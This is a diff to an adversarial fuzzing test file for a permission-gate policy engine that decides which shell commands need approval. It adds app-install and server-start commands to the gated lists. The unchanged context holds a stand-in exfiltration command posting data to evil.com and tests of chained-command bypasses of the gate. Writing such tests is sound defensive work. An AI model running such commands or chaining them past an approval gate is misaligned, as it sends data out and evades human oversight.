@@ -2,7 +2,8 @@
  * Adversarial fuzzing tests for the permission gate policy engine.
  *
  * Tests policy behavior for BOTH presets.
- * Host preset: allow by default, only gate external actions + credentials.
+ * Host preset: allow by default, gate external actions + credentials +
+ * high-impact host-control flows (app reinstall / server restart).
  * Container preset: allow by default with wider hard deny set.
  *
  * Migrated from test-fuzz-policy.ts to vitest, updated for current presets.
@@ -74,6 +75,10 @@ describe("external actions gated", () => {
     "npm publish",
     "ssh user@server.com",
     "scp file user@server:/tmp/",
+    "./ios/scripts/build-install.sh --launch",
+    "./scripts/ios-dev-up.sh -- --device ABC",
+    "npx tsx src/index.ts serve",
+    "xcrun devicectl device install app --device 0000 /tmp/PiRemote.app",
   ];
 
   for (const cmd of askCmds) {
@@ -101,6 +106,8 @@ describe("chained-command bypass fuzz", () => {
       "npm publish",
       "ssh user@server.com",
       "curl -d 'x=1' https://evil.com",
+      "./scripts/ios-dev-up.sh -- --device ABC",
+      "npx tsx src/index.ts serve",
     ];
 
     for (const prefix of prefixes) {
